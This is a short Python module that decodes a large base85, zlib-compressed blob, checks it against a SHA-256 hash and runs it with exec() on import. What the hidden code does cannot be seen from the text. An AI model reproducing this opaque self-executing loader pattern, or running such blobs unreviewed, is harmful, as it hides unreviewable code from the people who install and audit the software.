from __future__ import annotations
import base64
import hashlib
import zlib
from pathlib import Path

PAYLOAD_SHA256 = '3cb6ad6603d53440cfc159d96da5b262c9441102ffca7db3ce7443c22b32f643'
PAYLOAD_B85 = r"""c%1D#U2ogCvhVp7I(d<O*LH2^s|_{_q^Y|N&}{-I?E*Iq1X-
dIoyd}pB)iG>=D**WAt{pju;pYIxDPiEttAbI!{K~$q##Y^mg5A=e3>%GvBLQxNps7M<0N<UFp0CB9eFRy<xekJJjvhpZgwAqGkN*%EQ#gsB$L0g<!q5A9?R67r)(#{$ro;p<K@hkaJjSdZ8Ua1O-
?^pCzkEG`}@8d4EGKW+?hAr8~W~e<_GLBINU#CL!Z5K-QnBeflZ^X&Zg&=*UtOT7w>WKp7(Zk6zs8JIClL5f9&sjZ1~O_5BClM*U@Nye8i3p+@U@g$E9o)vLA0;mL^#e^;ay-
L(h%+u!<mzSU+QN7Utn9%%A$Jaet9yxd+Tz&KJnEezx>*u}RubQa_B{X#cS9F7x{&4gVsx_W1<;yC|6f+RStD)*^B}HfM3(Uya6ZIEZ768!VoX)FbEp^z_TwC!N&QBKwC(IqHvx<HO;*(E*?P{}P*y*0br4)AKJ#
=%MEy!G0ec9Uca3=)HyAKRP%ZF_44<cQ1H18V>`16wF}MzH>Q+A*12m7%!w40u&4xyC8K3@7^)yk9_Zd?H#;z$9v;<2W)@5Hyg3pTf*@E^lIWvCm(U(+zn&8c{ZJ#UY}olp{MvHIAAmHaR1Pqx$h2Lf3$aWu;(8f
%-
mo+8+r!^UI3GM9uT$jX)?tjs2v?pSKzJVbO$K|uCG|9yEC19JD>dNOfN2QUl4k*a8qDWb~C;u*%ps9KmlRBv1|~x{>;r7%(UaPz;fL5Zsn}pXvsQ3<lY@yS)O*S{%`od^*`2^Bxc7u7X0Pu6aRsKVeGR<m;{u2fE
WgJgD`Xnh&_62kz3yo@gz-?RE<p;n4p+2)4ebd=zg(A)^8_P#Nv*`+ie~ut|jD6f#X&#4P+>ZQA(Zc-t8>hrzmm#W6KY{T&|F#pC$eiEavCKv9+>-B()xT@FR>ZF=i0vY@T(xNa}<2FH#4Og^T>^-
W?wt+RvOI_Xi+BvpDcU?z0Y}?O7o7x%0rDvXkp{$>5s7Zn$}pW+xrHXZI}o*zWc$&>u9+ZsvvI$wxQJSa-l;FY#H&Ugkmnt=-
j^EsXIXBMLe&cXx2l9{uo+WjTn6V8M?RNOzDX2d12dUI(r4F^N~ts<K3FH^K?I8O$I2FzpC26U$(aVU|0|16^{`^7#T7Km&h-
`Mndnb4K$G@E2^2Jpd5903LAaa`u>aG`0z<dL$Kbeljleu#2d^$2Kwz7!<~LCkBg>Y#>ZW2WIIJMFmF|EX|N|FetzscLCQ<;D!+}zXL*hY`q8Vn2_{>c_}f4tx#WJk-FO0{XScXsX;)%p9;9L><Sc8yE%|hmsM*f
!x)wW4nPF@EJz<9|7=MDhZ)dl5ZhWh(q&w~7I<KHEl>h`$Pv0ZNdF?QhZYab5n=~XrHZNT%)4iE_ZzYwNIkYjJ?$BUAj=GH+8<BPKZ8BJ`uZ7N`}vm-
4jT7Ar>B>flc}u@$)6Ss2H=0VZ{2}I^5!@i%p6>fdxv14>I9`dT->7>JVukKBq2#176i-#PsW@qS*9M-
C*>Z9rJtDV!_YG4?gbl+A<Ot2VZ%7@2%eK25x)mv209yp%32I`Uf$LaNDgxp+GY?M?YfLgd!(b&z2}q#XDM@Yh7^*~(IEXW1I_X7n<2pY=fErGPg%B%^6X;4;#xp3YM`p@JYFRa%>a2Agx&>@4^E>f@fxPhz$br=
VTaO;ol%fc4~8Byojfvc*?@;rMYrKGsT@6h)}{ESWbAKI32I#nSI`=p%k{Caw}mZ&&2nZC@DLI(;m6kODQB7KoT>(Y)S1~h%(B4{qGY4TL=RAS4789l`}+_9np{H!RHm>1wEdkJMjd0|KlmVB0p7m>>^&=){Tp`q
)`$j@Wqw=(0vgYmM_!bH`y=f@U;0<LplJqZ$9oq2q=%VipoIMlvoHpm0GrbxBuE(UG~CKb#i~FYSC7IMg%AHA4$Z@O$@EFIv0|J#g&X@77&$|SRt(D6gTNt)dfWyfYr5Ui)WD^if;QxihDhIBfRo#@+IO-
A^Bm+)*5M|IT%?N3A~5SWa<6V>bjBFq$GhM{GNzC0iXB<T;Ofo6Fy!X8*f5+Ew+bKsaHEF~VqLpCIHITIW&`7WH+NBcDxybwDkKO0xLja-$?^`45|YyCc6DOt320WwUJ19-
wN4;9TkYGlgFM2A1qpoO9tHZvU6W?w(g2-
7>~qreeWIsIfnw$)K>#$a+b9qeu}1<Hc|PP!&ms4Y;CfhW0U|}(G<<_>0Sv<j83;N<%0wKbNau)t;lVS4Dn5x><(df6Sd;)L5`q~RPOz9_X_b}rh{iZM<|^PNk$|Kdv~Kvnyy8Y~6>$^CYW)gHfZzjMiF81W(<2!
-1Q$15f`rX^g3+-dQV@KzApZ=}!J%dW6#yPX98kCH8!=NK5(luBYB`c0AnTCqqF%Dc1$jFM6R7$fFRV7HFRr^$pVh))f%LSCsl{mR8UtEnkS2ez7)03u)Q}wep?eoY#vOWi!-
GY@7|Tz?07(0(@IMO<ke;7#8l@<<(oLY&mR!I%8C;@`(u#wR%bIyp0lmcqmh)p%|C;u7k+MF;vk>j$!b_<6Vr?b$GCNfKrbl45(ww5$W+@lGiOYq!P-
0PR8%HJcRc&99U)uEz0n*a#pY~=6ZroKr0f|EU%V)+Ei#)I;woIlVB(Es@Cswdq*#ii8f0no48B(cTp&JV~Oc{pm`Vx-CoWF1-
QB(X<T`8sU$G1ug##J?t(^Pd}+(HS~vnhh#mKy*|3L&A2hoV|A3T1R$EArVGw4x;U1kIgInWf$JV!dVsWhqvS1&4;wFh%JWCV3FS8s<x~P?{-
RqC;AMb}HQzI!plO#i0WYHbaLXMmum5^Ejd!M3jQAm<J6Xm$8Q{{J;VpbH%(=fKD9qst~x&9NK4R1~f#>zEzB^4OxP?6osq{T5utC@uUh)MPTSgQ3);nRRSEk39!PrYJpxeH3&ZlfDwGEFR*?hsklD~eNl7zk4>%
-bcG&5RslZaS8LpsvLyD!MuQxS^w!DP9adOP3s~TnieTFYs(E&|HKtK5CSXXXLcR@Q8|f@J>$t%%V+9N)#zv)I3$eRER9tm4RM%aEMrPC_#7eTg7DUIGvS1U&U0xZk2dWXPEn-k^1-
SBi$y`(xH^e4nAJFivvl)hIrl+mLlY6ieNlM29w26wan#hEsmXQfwVQmX<%E$z0z-!@<kqEj3<~Sk}-DqmpP!w{XikSLXa*%G6;%(CnHV5Lu@$#CuPAo)~W{vw-Ylup~FMd<;dYjmG%_>CNfJpU7D2X_afGV1V7s
)wWfqIOkPN<ZM1WI7!Y=+TA2cL*ylF(XSl7&GM7(xRI(8VPPnsGgdK<Xgzx2^9$Q}<Q|8S-2QFe&X1c7JmG&lp~TS~ui&$KT`Knn8Fae1#FIV|4{LvOrkz-_7{I=60HKo;1W#K%}-
=mWKs2JmaEWn}wY5VxQ{gMxMWHnP|Q02jW`FrV!WAhzxC4+0xOX$(;49;QQ{+pUBpmVvla0pDn|7f8Xu?<dXKxY0|VyNFxxfNklmewe7*blTa#&RHmxwDniQ5dIZ7=1guz}&J4?{lr7U0JcL-
pg&{u#EvmjRCmN6~>+HTv<aW1+b2U*iBU;^z6_KN6VqZiwGNm<jF-SE~=q*z`w&<f^w56&cjxFcej;Q=JhqG`Yf<jTyQMc>MTWfN1wc_n+RRF1qQI*YJUwN!nEcrTQ1VC2?&-
nAAV3WxLg%T7Qk_lr|&plPm{YR@6n5hw>zBGNUiWH3-kkuz=e|K)yXuw5@sbt67kOH<-wkou!WXYC^H$uBeGlBo^0~n_;&J$4w>T8K)9fd$!%REnHTnR;oHwA^HH_i3o2I*E=RyE7R+-OsxM`&+#u~X!=mOYB-Du
Gjh$O;5$HPWcf_AFUg9Qzo2)O_vk?uO8X9}&ICWe5xKPX{DB6nku<6J>Gd?~f=p2Nb*A9pEw#B?j1GA@c@46|kRg4fYariv0qUfk!r8wDg(d<`9$4mO0BrqlJkAR#lH<v=#?9T8s*VIfXJ#MCb47Z0+>wx@(p%oF
HV8ubq-17#ckOfDf(~G^$Pnr>aRM0hXgi&O;{N(MDoZ3s=xApXXho2k#X}BQ^N&?+Gchs-+FNCId%3ifR=^5o0o`{8wApsOJnv*(q5dF-
i6mdzHIq5%|*L>a#na`EL10uQf58P1N~VmI$P*YYbvh<Dq0dKWf4MskJt)bIlq>)Ivk%*hWwUX8Cdvu^T!(GXA+Og=+=Ij1I)A_=S1KaKO|mo(RJrI`*OCafJ+1)KOKXszs>60;sVfV_9Pc(3)w+sJ0%|h?wf@ZI
OeS+E_>m(+pGW$^t5o85709T9PW@Vnbzw+M$Vx6BB-=>N6OtnGk%s@})V#fax0Xr<negQGk}G%mCt{6a$D!{*^x4Ytqj8<e@31Q(33(jkVnK-
d!;8@yJ&<rINoa^vzNX^uxQDHs|k5hl*&fJ~C{1{(nlub!CB?LOkC0QrRc`tC*CcuT38*OMqf>ZDQF{qe|weS)%bR^eL#AzMt9^J>OL6U(;oxV4Isw*6n_PjZGF%WvQK1^+){-
PyU&SV0r#EIbjOQ10fU$sq0~{<G9k+)**@EwwO-
!ebr2I&!~A%_3{tWWvmS3jeQs97*+PqY~n#jwjFnS)Fam?DMAQrwXknh&lO74iE6YWNpKhRN<y;C7t6}Sd*(fyXpLKiDk6;ozIJSRLJ_0ND&5a=AJ7eW?UAQ|;yr^6)<T}FkH#{IA_}mJK-vXu0<aD0nx(0-
707XHJGJ=C)RO(iQg0scouh_f2?~pGAymc&untE;Jzgi(HnD;S1Rxfty$-SU8VQeFA7031i03Cr>cD5!Ze$SJIZ8DM8l?0m)-
L|vL5mhfjKpH{@#Ey|`uy9(xw`l|J)3ZW!M=4A76ixcXWsS?3)g;jcjY=c8KQP&Oxd<hrL9?xw+fB0h<H%(dypSJod;n}L4T68I0sOT#X1$R5X|d8PA~p@^2MoJwUC4IZBUVs;Ix-
4kkLPF+4L{ERwbuodn+E`JNOC+*J{#lS?pPc5s0B9`q7Q8D3(&sf0|zW#|Z+>U-
3QwyvOsk4U05;pf$tEadC4g?JB>wdFNo$BcDbHn`Y6Pg)!CkRc)u}+cnH%K?1I(I5S6vQ78B|*3m$P`q{?Vn)MYY19P95%ym{r4qT*^nS)@JfaQr!3OfwhdOe2Gh~#mZyE70W6V}`vJeEbEPHCEAe+mE-ON$^UjP
Dt?!1}n~OApu&8wE^D&}c{4e{U^gcjbnJ-!>w<5;a0{x}@ggt<+p&rB?4jtTnah8H0d`IarBCo|;Q8#Ft*4;Y}wo;9chTTJuTY!-
T5n+29TN#@h5rUa+8I5pSr$*g`z@#eSQYUleT)=l%&*eCcSrt@f$C1lnhz?*lQAy3C*8NtlN~5^p4z1v2g6rm=BO>}dtQ;Vj$i6>3%Ou5B+Wi&g>Db}#q<2naB#^fwBaZLY9Mxa9L!i<ddk3m4TaWO9d<nLSabO4
2LZr8gUGiU*Ci`0TENo=z@5pPo(rn0&cLhl0@Ntt07(wMmQL3Xhnngk4}%Sg?^mAyVXT=F*%YgD6`I@hmmWpCDon$cy<)4-X3y!9z_A%gjK<Qv_fuOql@&#4E@OV^pAs<r+D`u6#xEr#yssws*O!-
fC9ve=(Ic&;4W_c^-nG(y>E(d$h&$b>;`NC}p5{^Pj;HdkgDP(6ZKiD5%!9oFbO3{1OdmvK$2kT=ZXII<#rFTTDxzl+IEz@TD3?mC*<Y^WUiVo^M-}cQ`Gco2H?@@5Z?XBsPGYCuoGxUHV~ezM;mQE$E?my-Vhdy
&8}!4^qqg_b`7C>B`l;I}-3(8df)KBA0wcGACXsIxfG?$z5dm{ZHdH9t}IH;*~rt`~y!?j*D}~DiQmaDL%(nBWfPXrSCVad>@aarYztv^6lpuxHECar23A_2UFUh)&9gh?V|UF@rA&~egGvr#tUgc8w%lt(z0(-
M*l<+y+k1gyf;`B>!isKe(r&d9%#a}5bajS3yQ=MU#9Fch|>%4n?72ffn@lFST*(4Q6@Fmt^nB?x%1;qR!zfX8jyk_9g%KA%F8<An)yD(6dT|{5%D}uK`C3z<?D*SBF+4dX)^x|)Ci$AYeUAcvm#*pjK$v53>DLR
xI{-&9r@!viG&LN&SEgC-qll_yN^IAy?qGg<7-y?&Y(W0FhzfGe|G^}mBe@Nxz+jT=5AD-7{UO-jVVL>1mXk^X+=|&K*gKAlNA~?k9`2S!TkM6D%P5ztD_0}=<6SeCQ-QczXMa(j3d{2Zg|!PHq=PO)p7yqm(|0Q
Z#qr$FhIK8$0SbXPw&&j^&8$8UB(Y_@*|c*CXbANN#YbdeC-5MuyKh~7P*hLU}!<sLkKt02=uI16*L!2{-kJPk{u0Tz2+=;u_>hH0|cr82YjFW)&QmQ@p3+6Y0<rMIc=XR?&EnmA8$BeQPef2!F#seOG5`EB_R4-
M5*D1ik{k`KPPizfwf8~QB}%c%N+$T>flkcG&VjoPRsie__Wf+Z8IZb2PEYg47Soq8=nSEb=>0BAcJ!>e(el?>f$qb#DL1a%^V+axC*D%%`|7}9iCRnsYqY8nTsQ+PA2q;M*xK?6(4LcRH|o1?u<n>4e!RMOV%o<
@$nL!V9U+$cI9&<^1}i<4eR6)YRv9jO8SEE5f3}8Wh{f5=m}VfRukKfkp5@2Y)X@~#i}oNZ2VHiYd^t&@#7_E+}ZWl)6dSQ^Q-
HN>G>J_lqzvGxjdb6g}j_zTzvdnzs>OfA1NqP_0NB#V4;5!Mx8q^V<Cn~96fak4b+7(S?1bxNe~U)OJ+Rukl)F{sWKBOKL(?3!c@NQ(%qoM61{>eJ7{|AWlhz8rx+<THPgRxAkNUW=3kHdOZ-gQz-MfMKWfN8up9
13Z*Rz}-CC*_v@++7{R2bEPle;slPMlq(grt~MVzi@aU^x_&*CoqWvif=L0g4Aw5|WL_J>WY;5p^CRHNUf;N*3zMo&&ef>-
ME?{hVfDe~HF>6EVirG)Y*fJpSB1cT=$0<REqTk=GZ@iN+kSI61V?9>p(A<l)@Zckjv-
M^GT9^l}FWFBh>1OrH6%=RSWn+;|JWNX#|yRgA~)s~|RAR?vh8`!(OR^wFV)`ZtwxzUha5PDKqW5vJ5UL`S7hAiqJ){U^fT5Ucrn-
#<K<6o=ttC&}_;Vq&ubJvU3`7>Uh#`3{uj#deP5xLPkM$Ed7HI>%<e$kq*bF3!F(`881$^S+f>RBbJ(7!~rPD%<=ww4k(vfNx(m70{zla>Bb!t2CDO#B)#5h#?KHEK7nl#xx0*&rNuye#G5gif4<nPF?JU##8lF>
D;=bl+nffjGX$;>AIAL%j*uimlaoyESHY8K*45z*khyCII~ffzR*aBn2^jqADD(z7_sMS<i%K7Tp1&p>nex*c;wQC<*(zm)vB~($<RB6TH1mP09_Q5@n;A6>r$hc=7br#<gxCuhAhwsEV&w67vT{{I@958lLfOXs
J<k88J!Knyi>VFEZoH)2pjjWyXXLGLM$WKuRClodikr*B~rekfifd%y|GW<vt}i8B~4S2LO{L^n8KGL=woXO7^PI_x#+bV-C>ki(RdxSA$?yoGX=Z=;g<*R-
dcE;Z@F@Hsfldheyt34v2WV2A;>FWq477tAQ86b$NiSq?se0OM55v4~EO1C5YA)6i)o6Dhffht)y`NZK$Rwpq3RCKA=@qg@bOWtmsr$t1HCyvhCQm%7TA2l@?hq(W)&7DU7dC)vH+FQcX~yGOR1vQq>FopJj-rn&
4D%uvthf99U5{#d=4%h^SR-+7)T)s@-
5jdAa+Ac64(=8NU+75sHRGQIEz68%o#ajuL$hTl#|OGZqDXH0q_cVv#SMyv*R&uA|Ybbj24_Xv*!^@TQ=tFS^06KAo;V*wA%q%hQJ{2RSlphF`sL)2F&m2#DE*yknK8Q$1d@`}BQ#!rI4LCiNZ3uZJtjupUtVspH
jtUlt3rI1Dwg9$d|~)W1w88gPqwM8B=T)Ann4aut@)?#wa>q_<(3X(*R<>3h_YqHd3WpIT6)Rb9pBqpNk@t;?)(VA1S<L(S#a)6*|kA1|hVIHzAfoL`fH<p-
;UB_^W9s})HGda?>ruuVmOI+zr)7S84A^(XBAtFm6<XvJ+4CCanlxzC$0#5bWW-g&LQFUJ{OHonAKML}0H!Fn97x9%(EwtjVD8;7#~gXmSKg73kJ^Bn&EzJn@<Zzd2Z*T0?r1$%{_`2""".replace('\n', '')
raw = zlib.decompress(base64.b85decode(PAYLOAD_B85.encode('ascii')))
if hashlib.sha256(raw).hexdigest() != PAYLOAD_SHA256:
    raise RuntimeError('V17 payload SHA-256 drift')
exec(compile(raw, str(Path(__file__).resolve()), 'exec'), globals(), globals())
